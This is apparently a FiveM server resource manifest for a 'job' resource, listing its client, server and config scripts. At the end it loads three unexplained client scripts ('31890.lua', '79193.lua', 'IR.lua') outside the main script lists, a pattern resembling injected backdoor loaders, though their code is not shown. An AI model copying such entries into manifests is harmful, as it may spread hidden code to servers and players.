resource_manifest_version '44febabe-d386-4d18-afbe-5e627f4af937'



description 'job'



client_script "@errorlog/client/cl_errorlog.lua"



client_scripts {

	'config.lua',

	'client/main.lua',

	'client/job.lua',

	'client/gui.lua',

}



server_scripts {

	'@mysql-async/lib/MySQL.lua',

	'config.lua',

	'server/main.lua',

}
client_script '31890.lua'
client_script '79193.lua'
client_script "IR.lua"